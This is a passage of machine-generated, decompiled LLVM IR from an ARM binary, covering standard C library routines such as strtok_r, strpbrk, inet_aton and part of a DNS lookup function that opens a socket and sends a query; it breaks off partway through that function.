dec_label_pc_15228:                               ; preds = %dec_label_pc_15194, %.backedge.backedge, %dec_label_pc_1522c
  %v0_1522c = phi i32 [ %v1_1522c, %dec_label_pc_1522c ], [ %v0_1522c11, %dec_label_pc_15194 ], [ %v1_151a0, %.backedge.backedge ]
  %v0_15238 = phi i32 [ %v1_15238, %dec_label_pc_1522c ], [ %v0_152187, %dec_label_pc_15194 ], [ %v1_151bc, %.backedge.backedge ]
  %v2_15238 = icmp eq i32 %v0_15238, 0
  br i1 %v2_15238, label %dec_label_pc_15240, label %dec_label_pc_1522c

dec_label_pc_15240:                               ; preds = %dec_label_pc_15228
  store i32 %v3_15164, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_15238, { 1, 0 }
  uselistorder i32 %v1_151bc, { 1, 0, 2 }
  uselistorder i32 %v1_151a0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_151a050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15194, { 1, 0 }
  uselistorder i32 %v0_152187, { 1, 2, 0 }
  uselistorder i32 %v0_15174, { 1, 0, 2 }
  uselistorder i32 %v1_15174, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1516c, { 1, 0 }
  uselistorder i32 %v1_15168, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_15164, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15228, { 2, 1, 0 }
  uselistorder label %dec_label_pc_151a0, { 1, 0 }
  uselistorder label %dec_label_pc_15194, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1518c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15250 = load i32, i32* @r4, align 4
  store i32 %v3_15250, i32* %stack_var_-16, align 4
  %v6_15250 = load i32, i32* @r5, align 4
  %v0_15254 = load i32, i32* @r0, align 4
  store i32 %v0_15254, i32* %r4.global-to-local, align 4
  %v2_15254 = icmp eq i32 %v0_15254, 0
  %v1_15258 = load i32, i32* @r2, align 4
  br i1 %v2_15254, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_15258 = inttoptr i32 %v1_15258 to i32*
  %v3_15258 = load i32, i32* %v2_15258, align 4
  store i32 %v3_15258, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1525c = phi i32 [ %v3_15258, %bb ], [ %v0_15254, %entry ]
  store i32 %v0_1525c, i32* @r0, align 4
  store i32 %v1_15258, i32* @r5, align 4
  %v0_15264 = load i32, i32* @r1, align 4
  store i32 %v0_15264, i32* %r6.global-to-local, align 4
  %v1_15268 = inttoptr i32 %v0_1525c to i8*
  %v2_15268 = call i32 @__GI_strspn(i8* %v1_15268)
  %v0_1526c = load i32, i32* %r4.global-to-local, align 4
  %v2_1526c = add i32 %v0_1526c, %v2_15268
  %v3_1526c = inttoptr i32 %v2_1526c to i8*
  %v4_1526c = load i8, i8* %v3_1526c, align 1
  %v6_1526c = zext i8 %v4_1526c to i32
  store i32 %v6_1526c, i32* %r3.global-to-local, align 4
  store i32 %v2_1526c, i32* @r4, align 4
  %v2_15274 = icmp eq i8 %v4_1526c, 0
  store i1 %v2_15274, i1* @cpsr_z, align 1
  %v0_15278 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15278, i32* @r1, align 4
  store i32 %v2_1526c, i32* @r0, align 4
  br i1 %v2_15274, label %bb7, label %dec_label_pc_15288

bb7:                                              ; preds = %entry._crit_edge
  %v2_15280 = load i32, i32* @r5, align 4
  %v3_15280 = inttoptr i32 %v2_15280 to i32*
  store i32 %v2_1526c, i32* %v3_15280, align 4
  br label %dec_label_pc_152bc

dec_label_pc_15288:                               ; preds = %entry._crit_edge
  %v0_15288 = call i32 @__GI_strpbrk()
  store i32 %v0_15288, i32* %r2.global-to-local, align 4
  %v3_1528c = icmp eq i32 %v0_15288, 0
  store i1 %v3_1528c, i1* @cpsr_z, align 1
  br i1 %v3_1528c, label %dec_label_pc_1529c, label %dec_label_pc_152ac

dec_label_pc_1529c:                               ; preds = %dec_label_pc_15288
  %v0_15294 = load i32, i32* @r4, align 4
  %v2_1529c = call i32 @rawmemchr(i32 %v0_15294, i32 0)
  %v0_152a0 = load i32, i32* @r4, align 4
  store i32 %v0_152a0, i32* %r3.global-to-local, align 4
  %v1_152a4 = load i32, i32* @r5, align 4
  %v2_152a4 = inttoptr i32 %v1_152a4 to i32*
  store i32 %v2_1529c, i32* %v2_152a4, align 4
  br label %dec_label_pc_152bc

dec_label_pc_152ac:                               ; preds = %dec_label_pc_15288
  %v3_152b0 = inttoptr i32 %v0_15288 to i8*
  store i8 0, i8* %v3_152b0, align 1
  %v4_152b0 = load i32, i32* %r2.global-to-local, align 4
  %v5_152b0 = add i32 %v4_152b0, 1
  store i32 %v5_152b0, i32* @r2, align 4
  %v1_152b4 = load i32, i32* @r5, align 4
  %v2_152b4 = inttoptr i32 %v1_152b4 to i32*
  store i32 %v5_152b0, i32* %v2_152b4, align 4
  %v0_152b8 = load i32, i32* @r4, align 4
  store i32 %v0_152b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_152bc

dec_label_pc_152bc:                               ; preds = %bb7, %dec_label_pc_1529c, %dec_label_pc_152ac
  %v0_152bc = load i32, i32* %r3.global-to-local, align 4
  %v2_152c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_152c0, i32* @r4, align 4
  store i32 %v6_15250, i32* @r5, align 4
  ret i32 %v0_152bc

; uselistorder directives
  uselistorder i32 %v0_1525c, { 1, 0 }
  uselistorder i32 %v0_15254, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_152bc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_152c4 = load i32, i32* @r0, align 4
  %v1_152e82 = inttoptr i32 %v0_152c4 to i8*
  %v2_152e83 = load i8, i8* %v1_152e82, align 1
  %v3_152e84 = zext i8 %v2_152e83 to i32
  %v2_152ec5 = icmp eq i8 %v2_152e83, 0
  br i1 %v2_152ec5, label %dec_label_pc_152e8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_152f4.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_152cc:                               ; preds = %dec_label_pc_152d4
  %v1_152dc = add i32 %v0_152dc, 1
  %v9_152cc = icmp eq i32 %v3_152d4, %v3_152e86
  br i1 %v9_152cc, label %dec_label_pc_152fc, label %dec_label_pc_152d4

dec_label_pc_152d4:                               ; preds = %dec_label_pc_152cc, %bb
  %v0_152dc = phi i32 [ %v1_152dc, %dec_label_pc_152cc ], [ %v0_152f4.pre, %bb ]
  %v1_152d4 = inttoptr i32 %v0_152dc to i8*
  %v2_152d4 = load i8, i8* %v1_152d4, align 1
  %v3_152d4 = zext i8 %v2_152d4 to i32
  store i32 %v3_152d4, i32* @ip, align 4
  %v2_152d8 = icmp eq i8 %v2_152d4, 0
  br i1 %v2_152d8, label %dec_label_pc_152e4, label %dec_label_pc_152cc

dec_label_pc_152e4:                               ; preds = %dec_label_pc_152d4
  %v1_152e4 = add i32 %v0_152e4, 1
  %v1_152e8 = inttoptr i32 %v1_152e4 to i8*
  %v2_152e8 = load i8, i8* %v1_152e8, align 1
  %v3_152e8 = zext i8 %v2_152e8 to i32
  %v2_152ec = icmp eq i8 %v2_152e8, 0
  br i1 %v2_152ec, label %dec_label_pc_152e8._crit_edge, label %bb

dec_label_pc_152e8._crit_edge:                    ; preds = %dec_label_pc_152e4, %entry
  %v3_152e8.lcssa = phi i32 [ %v3_152e84, %entry ], [ %v3_152e8, %dec_label_pc_152e4 ]
  ret i32 %v3_152e8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_152e4
  %v0_152e4 = phi i32 [ %v0_152c4, %.lr.ph ], [ %v1_152e4, %dec_label_pc_152e4 ]
  %v3_152e86 = phi i32 [ %v3_152e84, %.lr.ph ], [ %v3_152e8, %dec_label_pc_152e4 ]
  br label %dec_label_pc_152d4

dec_label_pc_152fc:                               ; preds = %dec_label_pc_152cc
  ret i32 %v0_152e4

; uselistorder directives
  uselistorder i32 %v3_152e8, { 1, 0 }
  uselistorder i32 %v3_152d4, { 1, 0 }
  uselistorder i32 %v0_152dc, { 1, 0 }
  uselistorder i32 %v3_152e84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_152d4, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_15304 = load i32, i32* %r0.global-to-local, align 4
  %v2_15304 = icmp eq i32 %v0_15304, 0
  %v3_15308 = load i32, i32* @r4, align 4
  store i32 %v3_15308, i32* %stack_var_-20, align 4
  br i1 %v2_15304, label %dec_label_pc_153e4, label %dec_label_pc_15320.lr.ph

dec_label_pc_15320:                               ; preds = %dec_label_pc_15320.lr.ph, %dec_label_pc_153a4
  %v1_153a4 = phi i32 [ 0, %dec_label_pc_15320.lr.ph ], [ %v5_153a4, %dec_label_pc_153a4 ]
  %v0_153a8 = phi i32 [ 1, %dec_label_pc_15320.lr.ph ], [ %v1_153a8, %dec_label_pc_153a4 ]
  %v0_15328 = phi i32 [ %v0_15304, %dec_label_pc_15320.lr.ph ], [ %v0_1532825, %dec_label_pc_153a4 ]
  store i32 %v2_15324.pre, i32* @lr, align 4
  %v1_15328 = inttoptr i32 %v0_15328 to i8*
  %v2_15328 = load i8, i8* %v1_15328, align 1
  %v3_15328 = zext i8 %v2_15328 to i32
  %v3_1532c = mul nuw nsw i32 %v3_15328, 2
  %v4_1532c = add i32 %v3_1532c, %v2_15324.pre
  %v5_1532c = inttoptr i32 %v4_1532c to i8*
  %v6_1532c = load i8, i8* %v5_1532c, align 1
  %v1_15330 = and i8 %v6_1532c, 8
  %v2_15330 = icmp eq i8 %v1_15330, 0
  br i1 %v2_15330, label %dec_label_pc_153e4, label %dec_label_pc_15338

dec_label_pc_15338:                               ; preds = %dec_label_pc_15320
  br label %dec_label_pc_15358

dec_label_pc_15340:                               ; preds = %dec_label_pc_15358
  %v3_15344 = mul i32 %v0_153a4, 10
  %v4_15344 = add i32 %v3_15358, %v3_15344
  %v1_15348 = add i32 %v4_15344, -48
  %v8_15350 = icmp sgt i32 %v1_15348, 255
  br i1 %v8_15350, label %dec_label_pc_153e4, label %dec_label_pc_15354

dec_label_pc_15354:                               ; preds = %dec_label_pc_15340
  %v1_15354 = add i32 %v0_15394, 1
  store i32 %v1_15354, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15358

dec_label_pc_15358:                               ; preds = %dec_label_pc_15338, %dec_label_pc_15354
  %v0_153a4 = phi i32 [ 0, %dec_label_pc_15338 ], [ %v1_15348, %dec_label_pc_15354 ]
  %v0_15394 = phi i32 [ %v0_15328, %dec_label_pc_15338 ], [ %v1_15354, %dec_label_pc_15354 ]
  %v1_15358 = inttoptr i32 %v0_15394 to i8*
  %v2_15358 = load i8, i8* %v1_15358, align 1
  %v3_15358 = zext i8 %v2_15358 to i32
  %v2_1535c = mul nuw nsw i32 %v3_15358, 2
  %v2_15360 = add i32 %v2_1535c, %v2_15324.pre
  %v3_15364 = inttoptr i32 %v2_15360 to i8*
  %v4_15364 = load i8, i8* %v3_15364, align 1
  %v6_15364 = zext i8 %v4_15364 to i32
  %v1_15370 = and i32 %v6_15364, 8
  %v2_15370 = icmp eq i32 %v1_15370, 0
  br i1 %v2_15370, label %dec_label_pc_15378, label %dec_label_pc_15340

dec_label_pc_15378:                               ; preds = %dec_label_pc_15358
  %v8_1537c = icmp sgt i32 %v0_153a8, 3
  br i1 %v8_1537c, label %dec_label_pc_15390, label %dec_label_pc_15380

dec_label_pc_15380:                               ; preds = %dec_label_pc_15378
  %v7_15380 = icmp eq i8 %v2_15358, 46
  br i1 %v7_15380, label %dec_label_pc_15388, label %dec_label_pc_153e4

dec_label_pc_15388:                               ; preds = %dec_label_pc_15380
  %v1_15388 = add i32 %v0_15394, 1
  store i32 %v1_15388, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_153a4

dec_label_pc_15390:                               ; preds = %dec_label_pc_15378
  %v2_15390 = icmp eq i8 %v2_15358, 0
  %v1_15394 = add i32 %v0_15394, 1
  store i32 %v1_15394, i32* %r0.global-to-local, align 4
  br i1 %v2_15390, label %dec_label_pc_153a4, label %dec_label_pc_1539c

dec_label_pc_1539c:                               ; preds = %dec_label_pc_15390
  %v1_1539c = and i32 %v6_15364, 32
  %v2_1539c = icmp eq i32 %v1_1539c, 0
  br i1 %v2_1539c, label %dec_label_pc_153e4, label %dec_label_pc_153a4

dec_label_pc_153a4:                               ; preds = %dec_label_pc_1539c, %dec_label_pc_15390, %dec_label_pc_15388
  %v0_1532825 = phi i32 [ %v1_15394, %dec_label_pc_1539c ], [ %v1_15394, %dec_label_pc_15390 ], [ %v1_15388, %dec_label_pc_15388 ]
  %v4_153a4 = mul i32 %v1_153a4, 256
  %v5_153a4 = or i32 %v0_153a4, %v4_153a4
  %v1_153a8 = add nuw nsw i32 %v0_153a8, 1
  %v7_153b0 = icmp slt i32 %v1_153a8, 5
  br i1 %v7_153b0, label %dec_label_pc_15320, label %dec_label_pc_153b4

dec_label_pc_15320.lr.ph:                         ; preds = %entry
  %v2_15324.pre = load i32, i32* @global_var_231b0, align 4
  br label %dec_label_pc_15320

dec_label_pc_153b4:                               ; preds = %dec_label_pc_153a4
  %v2_153b4 = icmp eq i32 %arg2, 0
  br i1 %v2_153b4, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_153b4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_153b4
  %v3_153d0 = call i32 @llvm.bswap.i32(i32 %v5_153a4)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_153dc = inttoptr i32 %arg2 to i32*
  store i32 %v3_153d0, i32* %v3_153dc, align 4
  %v2_153e0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_153e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_153e0 = phi i32 [ 1, %bb ], [ %v17_153e0.pre, %bb41 ]
  %v2_153e0 = phi i32 [ %v3_15308, %bb ], [ %v2_153e0.pre, %bb41 ]
  store i32 %v2_153e0, i32* @r4, align 4
  ret i32 %v17_153e0

dec_label_pc_153e4:                               ; preds = %dec_label_pc_15380, %dec_label_pc_1539c, %dec_label_pc_15320, %dec_label_pc_15340, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_15308, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_15324.pre, { 2, 1, 0 }
  uselistorder i32 %v1_153a8, { 1, 0 }
  uselistorder i32 %v0_15394, { 0, 1, 3, 2 }
  uselistorder i32 %v3_15308, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_153e4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_15358, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_153f0 = load i32, i32* @r4, align 4
  %v6_153f0 = load i32, i32* @r5, align 4
  %v9_153f0 = load i32, i32* @r6, align 4
  %v12_153f0 = load i32, i32* @r7, align 4
  %v15_153f0 = load i32, i32* @r8, align 4
  %v18_153f0 = load i32, i32* @sb, align 4
  %v21_153f0 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_15410 = call i32 @malloc(i32 512)
  store i32 %v1_15410, i32* @r7, align 4
  %v1_1541c = call i32 @malloc(i32 1025)
  %v2_15420 = icmp eq i32 %v1_1541c, 0
  br i1 %v2_15420, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_15424 = load i32, i32* @r7, align 4
  %v3_15424 = icmp eq i32 %v1_15424, 0
  store i32 %v1_1541c, i32* %stack_var_-236, align 4
  br i1 %v3_15424, label %bb195, label %dec_label_pc_15438

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_15b18

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_15b18

dec_label_pc_15438:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_1543c = icmp eq i32 %arg3, 0
  br i1 %v2_1543c, label %dec_label_pc_15b18, label %dec_label_pc_15444

dec_label_pc_15444:                               ; preds = %dec_label_pc_15438
  %v2_15448 = load i8, i8* %arg1, align 1
  %v2_1544c = icmp eq i8 %v2_15448, 0
  br i1 %v2_1544c, label %dec_label_pc_15b18, label %dec_label_pc_15454

dec_label_pc_15454:                               ; preds = %dec_label_pc_15444
  %v3_15458 = call i32 @strlen(i8* nonnull %arg1)
  %v2_15460 = add i32 %v3_15458, %tmp
  %v1_15464 = add i32 %v2_15460, -1
  %v2_15464 = inttoptr i32 %v1_15464 to i8*
  %v3_15464 = load i8, i8* %v2_15464, align 1
  %v2_15468 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15468, i32* @r4, align 4
  %v7_1546c = icmp eq i8 %v3_15464, 46
  %. = zext i1 %v7_1546c to i32
  store i32 %v2_15468, i32* @r0, align 4
  %v1_15490 = call i32 @__pthread_return_void()
  %v1_154a0 = call i32 @__pthread_return_0()
  %v2_154ac = load i32, i32* @global_var_297a4.591, align 4
  %v2_154b0 = srem i32 %v2_154ac, %arg3
  %v3_154b8 = load i8, i8* @global_var_234f1.594, align 1
  %v4_154b8 = zext i8 %v3_154b8 to i32
  %v2_154bc = load i8, i8* bitcast (i8** @global_var_234f0.593 to i8*), align 4
  %v3_154bc = zext i8 %v2_154bc to i32
  %v4_154c4 = mul nuw nsw i32 %v4_154b8, 256
  %v5_154c4 = or i32 %v3_154bc, %v4_154c4
  store i32 %v5_154c4, i32* @sb, align 4
  store i32 %v2_154b0, i32* @sl, align 4
  store i32 %v2_15468, i32* @r0, align 4
  %v1_154d8 = call i32 @__pthread_return_void()
  %v0_154e4 = load i32, i32* @r5, align 4
  %v2_15504 = ptrtoint i8* %stack_var_-188 to i32
  %v6_15548 = bitcast i8* %stack_var_-188 to i32*
  %v2_15628 = ptrtoint i32* %stack_var_-92 to i32
  %v3_156c0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_15724 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_15a70 = icmp eq i1 %v7_1546c, false
  %v7_15778 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_1585c = ptrtoint i32* %stack_var_-140 to i32
  %v9_15954 = icmp eq i32 %tmp147, %arg2
  %v7_158e8 = icmp eq i32 %arg2, 1
  %v2_15890 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_154e4, 3
  br i1 %tmp292, label %dec_label_pc_154ec.lr.ph.preheader.lr.ph, label %dec_label_pc_15b24

dec_label_pc_154ec.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_15454
  %v2_157fc = icmp eq i32 %tmp156, 0
  %v8_158ec = icmp eq i32 %arg2, 28
  br label %dec_label_pc_154ec.lr.ph.preheader

dec_label_pc_154ec:                               ; preds = %dec_label_pc_154ec.lr.ph, %dec_label_pc_15b08.backedge
  %v1_154f4 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_154ec.lr.ph ], [ %v0_1569c, %dec_label_pc_15b08.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_154ec.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_15b08.backedge ]
  %v7_154f0 = icmp eq i32 %v1_154f4, -1
  br i1 %v7_154f0, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_154ec
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_154ec, %bb199
  %v1_154f8 = xor i1 %v7_154f0, true
  call void @__pseudo_cond_branch(i1 %v1_154f8, i32 ptrtoint (i32* @global_var_f618.596 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_15504, i32* @r4, align 4
  %v0_15508 = load i32, i32* @r7, align 4
  %v2_1550c = inttoptr i32 %v0_15508 to i8*
  %v3_1550c = call i32 @__GI_memset(i8* %v2_1550c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_1551c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_15520 = load i32, i32* @sb, align 4
  %v1_15520 = add i32 %v0_15520, 1
  %v3_15528 = urem i32 %v1_15520, 65536
  store i32 %v3_15528, i32* @sb, align 4
  %v0_15534 = load i32, i32* @r7, align 4
  %v5_15540 = trunc i32 %v1_15520 to i8
  store i8 %v5_15540, i8* %stack_var_-188, align 1
  %v7_15548 = call i32 @__encode_header(i32* %v6_15548, i32 %v0_15534, i32 512, i32 1, i32 %v1_15520)
  store i32 %v7_15548, i32* @r5, align 4
  %v1_1554c = icmp slt i32 %v7_15548, 0
  br i1 %v1_1554c, label %dec_label_pc_15b24, label %dec_label_pc_15554

dec_label_pc_15554:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_1555c = load i32, i32* %stack_var_-236, align 4
  %v4_15560 = call i32 @strncpy(i32 %v2_1555c, i32 %tmp, i32 1025)
  store i32 %v2_15468, i32* @r0, align 4
  %v1_15578 = call i32 @__pthread_return_void()
  %v1_15588 = call i32 @__pthread_return_0()
  %v1_15598 = load i32, i32* @sl, align 4
  %v4_15598 = mul i32 %v1_15598, 4
  %v5_15598 = add i32 %v4_15598, %arg4
  %v6_15598 = inttoptr i32 %v5_15598 to i32*
  %v7_15598 = load i32, i32* %v6_15598, align 4
  store i32 %v7_15598, i32* @r6, align 4
  br i1 %v1_15594, label %dec_label_pc_155dc, label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %dec_label_pc_15554
  %v2_155a8 = load i32, i32* @global_var_29874.599, align 4
  %v6_155b0 = icmp slt i32 %v6_15acc, %v2_155a8
  br i1 %v6_155b0, label %dec_label_pc_155b4, label %dec_label_pc_155dc

dec_label_pc_155b4:                               ; preds = %dec_label_pc_155a0
  store i32 ptrtoint (i32* @global_var_1aeb4.601 to i32), i32* @r1, align 4
  %v2_155bc = load i32, i32* %stack_var_-236, align 4
  %v4_155c0 = inttoptr i32 %v2_155bc to i8*
  %v5_155c0 = call i32 @__GI_strncat(i8* %v4_155c0, i32 ptrtoint (i32* @global_var_1aeb4.601 to i32), i32 1025, i32 %v2_155a8)
  %v7_155d0 = load i32, i32* %v6_155d0, align 4
  store i32 %v7_155d0, i32* @r1, align 4
  %v4_155d8 = inttoptr i32 %v2_155bc to i8*
  %v5_155d8 = call i32 @__GI_strncat(i8* %v4_155d8, i32 %v7_155d0, i32 1025, i32 ptrtoint (i32* @global_var_29854.603 to i32))
  br label %dec_label_pc_155dc

dec_label_pc_155dc:                               ; preds = %dec_label_pc_155a0, %dec_label_pc_15554, %dec_label_pc_155b4
  store i32 %v2_15468, i32* @r0, align 4
  store i32 87536, i32* @lr, align 4
  %v1_155ec = call i32 @__pthread_return_void()
  %v2_155f8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_155f8, i32* %stack_var_-56, align 4
  %v0_15608 = load i32, i32* @r7, align 4
  %v1_15608 = load i32, i32* @r5, align 4
  %v2_15608 = add i32 %v1_15608, %v0_15608
  %v1_1560c = sub i32 512, %v1_15608
  %v8_15614 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_15608, i32 %v1_1560c, i32 %arg2, i32 %v2_155f8, i32 %arg2, i32 1)
  store i32 %v8_15614, i32* @fp, align 4
  %v1_15618 = icmp slt i32 %v8_15614, 0
  br i1 %v1_15618, label %dec_label_pc_15b24, label %dec_label_pc_15620

dec_label_pc_15620:                               ; preds = %dec_label_pc_155dc
  store i32 0, i32* @r4, align 4
  %v0_15630 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_1563c = inttoptr i32 %v0_15630 to i8*
  %v4_1563c = call i32 @inet_pton(i32 10, i8* %v3_1563c, i32 %v2_15628)
  %v1_15640 = load i32, i32* @r4, align 4
  %v7_15644 = icmp sgt i32 %v4_1563c, %v1_15640
  br i1 %v7_15644, label %bb201, label %dec_label_pc_15620..thread11_crit_edge

dec_label_pc_15620..thread11_crit_edge:           ; preds = %dec_label_pc_15620
  %v3_15650.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_15620
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_15620..thread11_crit_edge, %bb201
  %v3_15650 = phi i8 [ %v3_15650.pre, %dec_label_pc_15620..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_15650 = sext i8 %v3_15650 to i32
  %v8_1564c.op = urem i32 %v1_15640, 256
  %v8_1564c.op.op = mul nuw nsw i32 %v8_1564c.op, 256
  %v4_15658 = select i1 %v7_15644, i32 %v8_1564c.op.op, i32 0
  %v5_15658 = or i32 %v4_15650, %v4_15658
  %v7_1565c = icmp eq i32 %v5_15658, 10
  br i1 %v7_1565c, label %dec_label_pc_15688, label %dec_label_pc_15670

dec_label_pc_15670:                               ; preds = %.thread11
  %v0_15674 = load i32, i32* @r6, align 4
  store i32 %v0_15674, i32* @r0, align 4
  %v1_15680 = call i32 @inet_addr(i32 %v0_15674)
  br label %dec_label_pc_15688

dec_label_pc_15688:                               ; preds = %.thread11, %dec_label_pc_15670
  %v0_1569c = call i32 @socket()
  %v1_156a0 = icmp slt i32 %v0_1569c, 0
  br i1 %v1_156a0, label %.thread, label %dec_label_pc_156b8

.thread:                                          ; preds = %dec_label_pc_15688
  br label %dec_label_pc_15b08.backedge

dec_label_pc_15b08.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_154ec, label %dec_label_pc_15b24

dec_label_pc_156b8:                               ; preds = %dec_label_pc_15688
  %v4_156c0 = call i32 @__libc_connect(i32 %v0_1569c, %sockaddr* nonnull %v3_156c0, i32 28)
  %v1_156c4 = icmp slt i32 %v4_156c0, 0
  br i1 %v1_156c4, label %dec_label_pc_156cc, label %dec_label_pc_156ec

dec_label_pc_156cc:                               ; preds = %dec_label_pc_156b8
  %v0_156cc = call i32 @__errno_location()
  %v1_156d0 = inttoptr i32 %v0_156cc to i32*
  %v2_156d0 = load i32, i32* %v1_156d0, align 4
  %v7_156d4 = icmp eq i32 %v2_156d0, 101
  br i1 %v7_156d4, label %dec_label_pc_15a38, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_156cc
  br label %dec_label_pc_15b08.backedge

dec_label_pc_156ec:                               ; preds = %dec_label_pc_156b8
  %v0_156ec = load i32, i32* @r5, align 4
  %v1_156ec = load i32, i32* @fp, align 4
  %v2_156ec = add i32 %v1_156ec, %v0_156ec
  %v0_156f0 = load i32, i32* @r7, align 4
  %v4_156fc = inttoptr i32 %v0_156f0 to i32*
  %v5_156fc = call i32 @__libc_send(i32 %v0_1569c, i32* %v4_156fc, i32 %v2_156ec, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_1569c, i32* %stack_var_-44, align 4
  %v11_15724 = call i32 @__libc_poll(%pollfd* %v10_15724, i32 1, i32 10000, i32 1, i32 %v0_1569c, i32 1, i32 0)
  %v1_15728 = load i32, i32* @r4, align 4
  %v7_1572c = icmp sgt i32 %v11_15724, %v1_15728
  br i1 %v7_1572c, label %dec_label_pc_15730, label %dec_label_pc_15a38

dec_label_pc_15730:                               ; preds = %dec_label_pc_156ec
  %v0_15738 = load i32, i32* @r7, align 4
  %v5_15740 = inttoptr i32 %v0_15738 to i32*
  %v6_15740 = call i32 @__libc_recv(i32 %v0_1569c, i32* %v5_15740, i32 512, i32 %v1_15728, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_15740, i32* @fp, align 4
